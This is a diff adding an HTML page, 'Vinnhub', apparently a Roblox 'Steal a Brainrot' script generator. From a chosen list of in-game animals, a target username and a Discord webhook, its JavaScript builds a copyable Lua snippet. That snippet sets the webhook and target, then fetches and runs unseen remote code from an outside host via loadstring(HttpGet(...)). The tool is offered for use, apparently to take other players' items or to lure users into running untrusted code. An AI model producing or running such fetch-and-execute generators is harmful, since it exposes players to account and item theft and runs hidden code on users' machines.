@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vinnhub</title>
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg: #0f0a1e;
+    --surface: #1a123a;
+    --panel: #2d1b69;
+    --border: #4c1d95;
+    --accent: #a855f7;
+    --purple: #9333ea;
+    --discord: #5865f2;
+    --green: #10b981;
+    --danger: #f43f5e;
+    --text: #e2e8f0;
+    --muted: #94a3b8;
+    --panel-shadow: 0 4px 6px -1px rgba(168, 85, 247, 0.15);
+  }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(168, 85, 247, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(168, 85, 247, 0.03) 1px, transparent 1px);
+    background-size: 44px 44px;
+    pointer-events: none;
+    z-index: 0;
+  }
+  .wrap {
+    position: relative;
+    z-index: 1;
+    max-width: 920px;
+    margin: 0 auto;
+    padding: 2.8rem 1.5rem 6rem;
+  }
+  /* ── Header ── */
+  header {
+    text-align: center;
+    margin-bottom: 3rem;
+    animation: fadeDown .55s ease both;
+  }
+  .logo-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 1rem;
+    margin-bottom: 0.5rem;
+  }
+  .logo-row::before,
+  .logo-row::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    max-width: 160px;
+  }
+  .logo-row::before { background: linear-gradient(to right, transparent, var(--accent)); }
+  .logo-row::after { background: linear-gradient(to left, transparent, var(--accent)); }
+  h1 {
+    font-size: clamp(1.9rem, 4.5vw, 3rem);
+    font-weight: 700;
+    letter-spacing: .1em;
+    text-transform: uppercase;
+    background: linear-gradient(130deg, var(--accent) 0%, var(--purple) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    line-height: 1;
+  }
+  .tagline {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .78rem;
+    letter-spacing: .18em;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-top: .4rem;
+  }
+  /* ── Panel base ── */
+  .panel {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    overflow: hidden;
+    margin-bottom: 1.2rem;
+    animation: fadeUp .5s ease both;
+    box-shadow: var(--panel-shadow);
+  }
+  .panel:nth-child(1) { animation-delay: .05s; }
+  .panel:nth-child(2) { animation-delay: .13s; }
+  .panel:nth-child(3) { animation-delay: .21s; }
+  .panel:nth-child(4) { animation-delay: .29s; }
+  .ph {
+    display: flex;
+    align-items: center;
+    gap: .6rem;
+    padding: .75rem 1.25rem;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+  }
+  .dot {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    flex-shrink: 0;
+    animation: blink 2.2s infinite;
+  }
+  .dot-cyan { background: var(--accent); box-shadow: 0 0 7px var(--accent); }
+  .dot-purple { background: var(--purple); box-shadow: 0 0 7px var(--purple); animation-delay:.4s; }
+  .dot-discord{ background: var(--discord); box-shadow: 0 0 7px var(--discord); animation-delay:.8s; }
+  .dot-green { background: var(--green); box-shadow: 0 0 7px var(--green); animation-delay:1.2s; }
+  .ph-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .72rem;
+    text-transform: uppercase;
+    letter-spacing: .15em;
+    background: linear-gradient(130deg, var(--accent) 0%, var(--purple) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .pb { padding: 1.25rem; }
+  .lbl {
+    display: block;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .68rem;
+    text-transform: uppercase;
+    letter-spacing: .13em;
+    color: var(--muted);
+    margin-bottom: .45rem;
+  }
+  .search-row {
+    display: flex;
+    gap: .6rem;
+    margin-bottom: .75rem;
+  }
+  .search-input {
+    flex: 1;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 7px;
+    padding: .55rem .85rem;
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .82rem;
+    outline: none;
+    transition: border-color .2s, box-shadow .2s;
+  }
+  .search-input:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(168, 85, 247, 0.25);
+  }
+  .search-input::placeholder { color: #64748b; }
+  .btn-sm {
+    padding: .5rem .9rem;
+    background: rgba(168, 85, 247, 0.1);
+    border: 1px solid rgba(168, 85, 247, 0.3);
+    border-radius: 7px;
+    color: var(--accent);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .68rem;
+    text-transform: uppercase;
+    letter-spacing: .08em;
+    cursor: pointer;
+    white-space: nowrap;
+    transition: background .2s, color .2s;
+  }
+  .btn-sm:hover {
+    background: rgba(168, 85, 247, 0.2);
+    color: var(--text);
+  }
+  .btn-sm.red {
+    color: var(--danger);
+    border-color: rgba(244, 63, 94, 0.3);
+    background: rgba(244, 63, 94, 0.05);
+  }
+  .btn-sm.red:hover {
+    background: rgba(244, 63, 94, 0.1);
+    color: var(--text);
+  }
+  .animal-list {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    height: 240px;
+    overflow-y: auto;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border) transparent;
+  }
+  .animal-list::-webkit-scrollbar { width: 4px; }
+  .animal-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+  .a-item {
+    display: flex;
+    align-items: center;
+    gap: .65rem;
+    padding: .48rem .9rem;
+    cursor: pointer;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+    transition: background .12s;
+    user-select: none;
+  }
+  .a-item:last-child { border-bottom: none; }
+  .a-item:hover { background: rgba(168, 85, 247, 0.08); }
+  .a-item.on { background: rgba(168, 85, 247, 0.15); }
+  .a-item input[type=checkbox] {
+    accent-color: var(--accent);
+    width: 13px; height: 13px;
+    cursor: pointer;
+    flex-shrink: 0;
+  }
+  .a-name { font-size: .88rem; line-height: 1.2; flex: 1; color: var(--text); }
+  .meta-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: .6rem;
+  }
+  .sel-count {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .7rem;
+    color: var(--muted);
+  }
+  .sel-count span { color: var(--accent); }
+  .txt {
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: .72rem 1rem;
+    color: var(--text);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .88rem;
+    outline: none;
+    transition: border-color .2s, box-shadow .2s;
+  }
+  .txt:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(168, 85, 247, 0.25);
+  }
+  .txt::placeholder { color: #64748b; }
+  .hint { font-family: 'Share Tech Mono', monospace; font-size: .67rem; color: var(--muted); margin-top: .4rem; }
+  .error { color: var(--danger) !important; font-weight: bold; }
+  .btn-gen {
+    display: block;
+    width: 100%;
+    padding: .92rem;
+    background: linear-gradient(130deg, var(--accent) 0%, var(--purple) 100%);
+    border: none;
+    border-radius: 10px;
+    color: white;
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 1.1rem;
+    font-weight: 700;
+    letter-spacing: .14em;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: all .2s;
+    box-shadow: 0 4px 6px -1px rgba(168, 85, 247, 0.25);
+    margin-bottom: 1.2rem;
+  }
+  .btn-gen:hover {
+    box-shadow: 0 6px 12px -2px rgba(168, 85, 247, 0.35);
+    transform: translateY(-1px);
+  }
+  .btn-gen:active { transform: none; }
+  .out-ph { display: flex; align-items: center; gap: .6rem; padding: .75rem 1.25rem; background: var(--surface); border-bottom: 1px solid var(--border); }
+  .out-ph-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .72rem;
+    text-transform: uppercase;
+    letter-spacing: .15em;
+    background: linear-gradient(130deg, var(--accent) 0%, var(--purple) 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .btn-copy {
+    margin-left: auto;
+    padding: .26rem .7rem;
+    background: rgba(168, 85, 247, 0.1);
+    border: 1px solid rgba(168, 85, 247, 0.3);
+    border-radius: 6px;
+    color: var(--accent);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .68rem;
+    text-transform: uppercase;
+    letter-spacing: .1em;
+    cursor: pointer;
+    transition: all .2s;
+  }
+  .btn-copy:hover { background: rgba(168, 85, 247, 0.2); }
+  .btn-copy.ok { color: var(--green); border-color: var(--green); background: rgba(16, 185, 129, 0.1); }
+  .code-block {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem 1.2rem;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: .79rem;
+    line-height: 1.8;
+    color: var(--text);
+    min-height: 120px;
+    max-height: 480px;
+    overflow-y: auto;
+    white-space: pre;
+    overflow-x: auto;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border) transparent;
+  }
+  .code-block.empty { color: var(--muted); font-style: italic; white-space: pre-wrap; }
+  @keyframes fadeDown { from { opacity:0; transform: translateY(-16px); } to { opacity:1; transform: none; } }
+  @keyframes fadeUp { from { opacity:0; transform: translateY(16px); } to { opacity:1; transform: none; } }
+  @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:.3; } }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <div class="logo-row"><h1>Vinnhub</h1></div>
+    <p class="tagline">Roblox • Brainrot Animals • Script Generator</p>
+  </header>
+  <div class="panel">
+    <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
+    <div class="pb">
+      <div class="search-row">
+        <input class="search-input" id="searchBox" type="text" placeholder="Search animals..." oninput="filterList()">
+        <button class="btn-sm" onclick="selectAll()">All</button>
+        <button class="btn-sm red" onclick="clearAll()">Clear</button>
+      </div>
+      <div class="animal-list" id="animalList"></div>
+      <div class="meta-row">
+        <span class="sel-count"><span id="selNum">0</span> selected</span>
+      </div>
+    </div>
+  </div>
+  <div class="panel">
+    <div class="ph"><div class="dot dot-purple"></div><span class="ph-title">Roblox Username</span></div>
+    <div class="pb">
+      <label class="lbl">Target username</label>
+      <input class="txt" id="usernameInput" type="text" placeholder="e.g. Builderman" autocomplete="off" spellcheck="false" oninput="validateUsername()">
+      <p class="hint" id="usernameHint">The Roblox username to target in the script (3 characters minimum).</p>
+    </div>
+  </div>
+  <div class="panel">
+    <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Discord Webhook</span></div>
+    <div class="pb">
+      <label class="lbl">Webhook URL</label>
+      <input class="txt" id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false" oninput="validateWebhook()">
+      <p class="hint" id="webhookHint">Paste your Discord webhook (must start with https://discord.com/api/webhooks/).</p>
+    </div>
+  </div>
+  <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>
+  <div class="panel">
+    <div class="out-ph">
+      <div class="dot dot-green"></div>
+      <span class="out-ph-title">Generated Script</span>
+      <button class="btn-copy" id="copyBtn" onclick="copyOut()">⧉ Copy</button>
+    </div>
+    <div class="pb">
+      <div class="code-block empty" id="outputBlock">-- Fill in the fields above and hit Generate Script...</div>
+    </div>
+  </div>
+</div>
+<script>
+const ANIMALS = ["1x1x1x1","25","67","Admin Lucky Block","Agarrini la Palini","Alessio","Anpali Babel","Antonio","Aquanaut","Arcadopus","Astrolero Cervalero","Avocadini Antilopini","Avocadini Guffo","Avocadorilla","Bacuru and Egguru","Ballerina Cappuccina","Ballerina Peppermintina","Ballerino Lololo","Bambini Crostini","Bambu Bambu Sahur","Bananita Dolphinita","Bananito Bandito","Bandito Axolito","Bandito Bobritto","Belula Beluga","Berenjello Angello","Bisonte Giuppitere","Blackhole Goat","Blueberrinni Octopusini","Boatito Auratito","Boba Panda","Bombardini Tortinii","Bombardiro Crocodilo","Bombombini Gusini","Boneca Ambalabu","Brainrot God Lucky Block","Brasilini Berimbini","Brr Brr Patapim","Brr es Teh Patipum","Brri Brri Bicus Dicus Bombicus","Brunito Marsito","Brutto Gialutto","Buho de Fuego","Buho de Noelo","Buho del Cielo","Bulbito Bandito Traktorito","Bunito Bunito Spinito","Bunnyman","Burbaloni Loliloli","Burguro And Fryuro","Burrito Bandito","Cacasito Satalito","Cachorrito Melonito","Cacto Hipopotamo","Capi Taco","Capitano Moby","Cappuccino Assassino","Cappuccino Clownino","Caramello Filtrello","Carloo","Carrotini Brainini","Cavallo Virtuoso","Celestial Pegasus","Celularcini Viciosini","Centrucci Nuclucci","Cerberus","Chachechi","Chef Crabracadabra","Chicleteira Bicicleteira","Chicleteira Cupideira","Chicleteira Noelteira","Chicleteirina Bicicleteirina","Chihuanini Taconini","Chill Puppy","Chillin Chili","Chimnino","Chimpanzini Bananini","Chipso and Queso","Chocco Bunny","Chrismasmamat","Cigno Fulgoro","Clickerino Crabo","Cocoa Assassino","Cocofanto Elefanto","Cocosini Mama","Coffin Tung Tung Tung Sahur","Cooki and Milki","Corn Corn Corn Sahur","Crabbo Limonetta","Cuadramat and Pakrahmatmamat","Cupcake Koala","Cupid Cupid Sahur","Cupid Hotspot","DJ Panda","Divino Platypio","Doi Doi Do","Dolphini Jetskini","Donkeyturbo Express","Dragon Cannelloni","Dragon Gingerini","Dug dug dug","Dul Dul Dul","Dumborino Miracello","Elefanto Frigo","Esok Sekolah","Espresso Signora","Eviledon","Extinct Ballerina","Extinct Matteo","Extinct Tralalero","Festive 67","Festive Lucky Block","Fishboard","Fishino Clownino","Fizzy Soda","Fluriflura","Fragola La La La","Fragrama and Chocrama","Frankentteo","Frigo Camelo","Frio Ninja","Frogato Pirato","Frogo Elfo","GOAT","Ganganzelli Trulala","Gangster Footera","Garama and Madundung","Gato Celesto","Gattatino Nyanino","Gattito Tacoto","Giftini Spyderini","Ginger Cisterna","Ginger Gerat","Ginger Globo","Girafa Celestre","Glorbo Fruttodrillo","Gobblino Uniciclino","Gold Elf","Gorillo Subwoofero","Gorillo Watermelondrillo","Graipuss Medussi","Granchiello Spiritell","Griffin","Guerriro Digitale","Guest 666","Harpuccino","Headless Horseman","Heart Lucky Block","Ho Ho Ho Sahur","Holy Arepa","Horegini Boom","Hydra Dragon Cannelloni","Jacko Jack Jack","Jacko Spaventosa","Jackorilla","Jingle Jingle Sahur","Job Job Job Sahur","Jolly Jolly Sahur","Karker Sahur","Karkerheart Luvkur","Karkerkar Kurkur","Ketchuru and Musturu","Ketupat Bros","Ketupat Kepat","Krupuk Pagi Pagi","La Casa Boo","La Cucaracha","La Extinct Grande","La Food Combinasion","La Ginger Sekolah","La Grande Combinasion","La Jolly Grande","La Karkerkar Combinasion","La Romantic Grande","La Sahur Combinasion","La Secret Combinasion","La Spooky Grande","La Supreme Combinasion","La Taco Combinasion","La Vacca Jacko Linterino","La Vacca Prese Presente","La Vacca Saturno Saturnita","Las Capuchinas","Las Sis","Las Tralaleritas","Las Vaquitas Saturnitas","Lavadorito Spinito","Lerulerulerule","Lionel Cactuseli","Lirilì Larilà","List List List Sahur","Los 25","Los 67","Los Amigos","Los Bombinitos","Los Bros","Los Burritos","Los Candies","Los Chicleteiras","Los Chihuaninis","Los Combinasionas","Los Crocodillitos","Los Cucarachas","Los Cupids","Los Gattitos","Los Hotspotsitos","Los Jobcitos","Los Jolly Combinasionas","Los Karkeritos","Los Lucky Blocks","Los Matteos","Los Mi Gatitos","Los Mobilis","Los Noobinis","Los Nooo My Hotspotsitos","Los Orcalitos","Los Planitos","Los Primos","Los Puggies","Los Quesadillas","Los Sekolahs","Los Spaghettis","Los Spooky Combinasionas","Los Spyderinis","Los Sweethearts","Los Taco Blocks","Los Tacoritas","Los Tipi Tacos","Los Tortus","Los Tralaleritos","Los Trios","Los Tungtungtungcitos","Love Love Bear","Love Love Love Sahur","Lovin Rose","Luv Luv Luv","Magi Ribbitini","Malame Amarele","Mangolini Parrocini","Mariachi Corazoni","Mastodontico Telepiedone","Matteo","Meowl","Mi Gatito","Mieteteira Bicicleteira","Money Money Man","Money Money Puggy","Money Money Reindeer","Mummio Rappitto","Mummy Ambalabu","Mythic Lucky Block","Nacho Spyder","Naughty Naughty","Noo La Polizia","Noo my Candy","Noo my Heart","Noo my Present","Noo my examine","Noobini Pizzanini","Noobini Santanini","Nooo My Hotspot","Nuclearo Dinossauro","Odin Din Din Dun","Orangutini Ananassini","Orcaledon","Orcalero Orcala","Orcalita Orcala","Pakrahmatmamat","Pakrahmatmatina","Pandaccini Bananini","Pandanini Frostini","Paradiso Axolottino","Pengolino Nuvoletto","Penguin Tree","Penguino Cocosino","Perochello Lemonchello","Perrito Burrito","Pi Pi Watermelon","Piccione Macchina","Piccionetta Macchina","Pinealotto Fruttarino","Pipi Avocado","Pipi Corni","Pipi Kiwi","Pipi Potato","Pirulitoita Bicicleteira","Please my Present","Pop Pop Sahur","Popcuru and Fizzuru","Pot Hotspot","Pot Pumpkin","Premium Festive Lucky Block","Premium Heart Lucky Block","Puffaball","Pumpkini Spyderini","Quackula","Quesadilla Crocodila","Quesadillo Vampiro","Quivioli Ameleonni","Raccooni Jandelini","Rang Ring Bus","Reindeer Tralala","Reinito Sleighito","Rhino Helicopterino","Rhino Toasterino","Rocco Disco","Rosetti Tualetti","Rosey and Teddy","Salamino Penguino","Sammyni Fattini","Sammyni Spyderini","Santa Hotspot","Santteo","Sealo Regalo","Secret Lucky Block","Serafinna Medusella","Seraphino Gruyero","Sigma Boy","Sigma Girl","Signore Carapace","Skibidi Toilet","Skull Skull Skull","Snailenzo","Spaghetti Tualetti","Spinny Hammy","Spioniro Golubiro","Spongini Quackini","Spooky Lucky Block","Spooky and Pumpky","Squalanana","Stoppo Luminino","Strawberrelli Flamingelli","Strawberry Elephant","Svinina Bombardino","Swag Soda","Swaggy Bros","Ta Ta Ta Ta Sahur","Taco Lucky Block","Tacorillo Crocodillo","Tacorita Bicicleta","Talpa Di Fero","Tang Tang Keletang","Tartaragno","Tartaruga Cisterna","Te Te Te Sahur","Telemorte","Tentacolo Tecnico","Ti Ti Ti Sahur","Tictac Sahur","Tigrilini Watermelini","Tigroligre Frutonni","Tim Cheese","Tipi Topi Taco","Tirilikalika Tirilikalako","To to to Sahur","Tob Tobi Tobi","Toiletto Focaccino","Tootini Shrimpini","Torrtuginni Dragonfrutini","Tracoducotulu Delapeladustuz","Tractoro Dinosauro","Tralaledon","Tralalero Tralala","Tralalita Tralala","Tree Tree Tree Sahur","Trenostruzzo Turbo 3000","Trenostruzzo Turbo 4000","Tric Trac Baraboom","Trickolino","Triplito Tralaleritos","Trippi Troppi","Trippi Troppi Troppa Trippa","Trulimero Trulicina","Tuff Toucan","Tukanno Bananno","Tung Tung Tung Sahur","Unclito Samito","Urubini Flamenguini","Vampira Cappucina","Ventoliero Pavonero","Vulturino Skeletono","W or L","Wombo Rollo","Yess my examine","Yeti Claus","Zibra Zubra Zibralini","Zombie Tralala"];
+let selected = new Set();
+
+function renderList(filter) {
+  const q = (filter || '').toLowerCase();
+  const list = document.getElementById('animalList');
+  list.innerHTML = '';
+  ANIMALS.forEach(name => {
+    if (q && !name.toLowerCase().includes(q)) return;
+    const row = document.createElement('div');
+    row.className = 'a-item' + (selected.has(name) ? ' on' : '');
+    const cb = document.createElement('input');
+    cb.type = 'checkbox';
+    cb.checked = selected.has(name);
+    cb.addEventListener('change', e => { e.stopPropagation(); toggle(name); });
+    const lbl = document.createElement('span');
+    lbl.className = 'a-name';
+    lbl.textContent = name;
+    row.appendChild(cb);
+    row.appendChild(lbl);
+    row.addEventListener('click', e => { if (e.target !== cb) toggle(name); });
+    list.appendChild(row);
+  });
+  document.getElementById('selNum').textContent = selected.size;
+}
+
+function toggle(name) {
+  selected.has(name) ? selected.delete(name) : selected.add(name);
+  renderList(document.getElementById('searchBox').value);
+}
+
+function filterList() { renderList(document.getElementById('searchBox').value); }
+function selectAll() { ANIMALS.forEach(n => selected.add(n)); renderList(document.getElementById('searchBox').value); }
+function clearAll() { selected.clear(); renderList(document.getElementById('searchBox').value); }
+
+function validateUsername() {
+  const username = document.getElementById('usernameInput').value.trim();
+  const hint = document.getElementById('usernameHint');
+  if (username.length < 3) {
+    hint.classList.add('error');
+    hint.textContent = 'Username must be at least 3 characters long!';
+    return false;
+  } else {
+    hint.classList.remove('error');
+    hint.textContent = 'The Roblox username to target in the script (3 characters minimum).';
+    return true;
+  }
+}
+
+function validateWebhook() {
+  const webhook = document.getElementById('webhookInput').value.trim();
+  const hint = document.getElementById('webhookHint');
+  if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
+    hint.classList.add('error');
+    hint.textContent = 'Webhook must start with https://discord.com/api/webhooks/!';
+    return false;
+  } else {
+    hint.classList.remove('error');
+    hint.textContent = 'Paste your Discord webhook (must start with https://discord.com/api/webhooks/).';
+    return true;
+  }
+}
+
+function generate() {
+  const username = document.getElementById('usernameInput').value.trim();
+  const webhook = document.getElementById('webhookInput').value.trim();
+  const out = document.getElementById('outputBlock');
+
+  if (selected.size === 0) {
+    out.className = 'code-block empty';
+    out.textContent = '-- Please select at least one brainrot animal.';
+    return;
+  }
+  if (!validateUsername()) {
+    out.className = 'code-block empty';
+    out.textContent = '-- Username must be at least 3 characters long.';
+    return;
+  }
+  if (!validateWebhook()) {
+    out.className = 'code-block empty';
+    out.textContent = '-- Webhook must start with https://discord.com/api/webhooks/';
+    return;
+  }
+
+  const names = [...selected];
+  const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
+  const script =
+`getgenv().WEBHOOK_URL = "${webhook}"
+getgenv().TARGET_USERNAME = "${username}"
+getgenv().TARGET_BRAINROT = {
+${brainrotLines}
+}
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/57d31ab71c35bd4b18d7c1ac52f950759f423c35b348cca80a7ae9724c0abe49/download"))()`;
+  out.className = 'code-block';
+  out.textContent = script;
+}
+
+function copyOut() {
+  const code = document.getElementById('outputBlock').textContent;
+  if (!code || code.startsWith('--')) return;
+  navigator.clipboard.writeText(code).then(() => {
+    const btn = document.getElementById('copyBtn');
+    btn.textContent = '✓ Copied!';
+    btn.classList.add('ok');
+    setTimeout(() => { btn.textContent = '⧉ Copy'; btn.classList.remove('ok'); }, 2000);
+  });
+}
+
+renderList();
+</script>
+</body>
+</html>
